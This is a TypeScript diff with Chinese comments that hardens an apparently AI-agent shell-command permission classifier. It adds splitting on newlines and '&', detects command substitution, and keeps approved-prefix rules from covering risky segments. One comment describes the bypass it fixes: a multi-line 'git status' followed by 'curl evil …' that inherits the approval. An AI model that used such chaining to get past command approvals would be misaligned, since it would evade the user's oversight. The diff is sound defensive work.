@@ -71,6 +71,11 @@ export interface CommandSegment {
    * 单看第一个词判只读会漏掉「`echo x > 任意文件`」——跑的程序是只读的，落盘不是。
    */
   redirect: boolean
+  /**
+   * 这一段里有命令替换（引号外的反引号，或任何位置的 `$(`）：替换内容会先执行一遍，
+   * `echo $(node -e …)` 的头虽然是只读的 echo，真正干活的替换内容什么都能干。
+   */
+  subst: boolean
 }
 
 const DECISION_SEVERITY: Record<CommandDecision, number> = { allow: 0, ask: 1, deny: 2 }
@@ -82,8 +87,14 @@ function strictest(a: CommandDecision, b: CommandDecision): CommandDecision {
 
 // ---------------------------------------------------------------- 命令切段
 
-/** 控制操作符：切段点。`&&` `||` 要在 `&` `|` 之前匹配，否则会切碎。 */
-const OPERATORS = ['&&', '||', ';', '|', '\n', '&&']
+/**
+ * 切段点 = shell 真正的分隔符。`&&` `||` 是 2 字符操作符，要在单 `&` 之前认，否则切碎；
+ * 单字符认 `;` `|` 与换行（`\n` `\r`）——PowerShell 与 sh 都把换行当命令分隔符，
+ * 不切的话「第一行带已授权前缀、第二行干别的」的多行命令会被整段按前缀放行
+ * （2026-09-29 审查发现）；孤立 `&` 在 POSIX 是后台执行，同样是分隔符，
+ * PowerShell 里整条本就是语法错误，切开判只会更严不会更松。
+ * `2>&1`（`&` 紧跟在 `>` 后）与 `&>文件`（`&` 后面是 `>`）是重定向，不是分隔符，不能切。
+ */
 
 /**
  * 把命令切成独立段。
@@ -95,7 +106,7 @@ export function splitSegments(command: string): CommandSegment[] {
   const src = command.replace(/\\\r?\n/g, ' ')
   const segments: CommandSegment[] = []
   let current = ''
-  let quote: '"' | "'" | '`' | null = null
+  let quote: '"' | "'" | null = null
   let depth = 0
 
   const push = (): void => {
@@ -115,11 +126,13 @@ export function splitSegments(command: string): CommandSegment[] {
       } else if (ch === quote) quote = null
       continue
     }
-    if (ch === '"' || ch === "'" || ch === '`') {
+    if (ch === '"' || ch === "'") {
       quote = ch
       current += ch
       continue
     }
+    // 反引号不进引号态：在 sh 里它是命令替换（内容照样执行），在 PowerShell 里行尾反引号是续行。
+    // 当引号处理会让替换内容里的 `;`、`|`、换行躲过切段——替换内容必须单独成段受审。
     if (ch === '(' || ch === '$(') {
       // 子 shell：整段留在这里判，但一旦因此判不清就不许走已授权规则。
       depth += 1
@@ -136,11 +149,18 @@ export function splitSegments(command: string): CommandSegment[] {
       continue
     }
     const two = src.slice(i, i + 2)
-    const op = OPERATORS.includes(two) ? two : ch === ';' || ch === '|' ? ch : null
+    let op: string | null = null
+    if (two === '&&' || two === '||') {
+      op = two
+    } else if (ch === ';' || ch === '|' || ch === '\n' || ch === '\r') {
+      op = ch
+    } else if (ch === '&' && two !== '&>' && src[i - 1] !== '>') {
+      // 孤立 `&`：POSIX 后台执行分隔符；`2>&1`（前面是 `>`）与 `&>`（后面是 `>`）是重定向，不切。
+      op = ch
+    }
     if (op !== null) {
-      // `|` 后接重定向（`2>&1`）不改判定；`>` `<` 留给 ruleUnfriendly 兜。
       push()
-      if (op === '||' || op === '&&') i += 1
+      if (op.length === 2) i += 1
       continue
     }
     current += ch
@@ -158,6 +178,7 @@ function tokenize(raw: string): CommandSegment {
   let started = false
   let ruleUnfriendly = false
   let redirect = false
+  let subst = false
 
   const flush = (): void => {
     if (started) tokens.push(buf)
@@ -168,12 +189,26 @@ function tokenize(raw: string): CommandSegment {
   for (let i = 0; i < raw.length; i += 1) {
     const ch = raw[i]!
     if (quote !== null) {
-      if (ch === quote) quote = null
-      else buf += ch
+      if (ch === quote) {
+        quote = null
+      } else {
+        // sh 的双引号里 `$()` 与反引号照样执行（PowerShell 的 `$()` 也是），替换内容得拦下；
+        // 单引号里两个 shell 都是字面量，不标记。
+        if (quote === '"' && ((ch === '$' && raw[i + 1] === '(') || ch === '`')) {
+          ruleUnfriendly = true
+          subst = true
+        }
+        buf += ch
+      }
       started = true
       continue
     }
     if (ch === '"' || ch === "'" || ch === '`') {
+      if (ch === '`') {
+        // 引号外的反引号：sh 的命令替换（PowerShell 行尾是续行，从严处理不区分）。
+        ruleUnfriendly = true
+        subst = true
+      }
       quote = ch
       started = true
       continue
@@ -184,6 +219,7 @@ function tokenize(raw: string): CommandSegment {
     }
     // 重定向 / 通配符 / 变量赋值 / 命令替换：规则匹配一律不看这类段（抄 Codex 那段话）。
     if (ch === '>' || ch === '<' || ch === '*' || ch === '?' || ch === '$') ruleUnfriendly = true
+    if (ch === '$' && raw[i + 1] === '(') subst = true
     // `>文件` / `>>文件` 是往盘上写；`2>&1` 只是接文件描述符，不算写文件。
     if (ch === '>' && raw[i + 1] !== '&') redirect = true
     if (ch === '=' && buf.length > 0 && /^[A-Za-z_][A-Za-z0-9_]*$/.test(buf)) ruleUnfriendly = true
@@ -191,7 +227,7 @@ function tokenize(raw: string): CommandSegment {
     started = true
   }
   flush()
-  return { tokens, raw, ruleUnfriendly, redirect }
+  return { tokens, raw, ruleUnfriendly, redirect, subst }
 }
 
 // ---------------------------------------------------------------- 内置危险模式
@@ -522,7 +558,10 @@ export function classifyCommand(command: string, options: ClassifyOptions = {}):
     }
 
     const allowRule = rules.find((rule) => rule.decision === 'allow' && matchRule(rule, segment) !== null)
-    if (allowRule !== undefined) {
+    // 已授权规则只替用户免掉「这一段本来要问」的判断，前提是这段就是用户批的那个样子：
+    // 带重定向、变量赋值或命令替换的段不给走规则——否则 `git status` 的授权会被
+    // 「git status⏎curl evil …」这类多行命令整个继承（2026-09-29 审查发现）。
+    if (allowRule !== undefined && !segment.redirect && !segment.ruleUnfriendly) {
       matchedRule = matchedRule ?? allowRule
       continue
     }
@@ -581,6 +620,8 @@ function unwrapHeads(tokens: readonly string[]): string[] {
 function isReadOnlySegment(segment: CommandSegment): boolean {
   // 往盘上写东西的段一律不算只读：跑的程序再安全，落盘也是动手。
   if (segment.redirect) return false
+  // 命令替换（$() 与反引号）会先把替换内容跑一遍再交给外面的命令：头是 echo 也拦不住替换里那把刀。
+  if (segment.subst) return false
   const tokens = unwrapHeads(segment.tokens)
   const head = tokens[0]?.toLowerCase().replace(/\.exe$/, '')
   if (head === undefined) return false
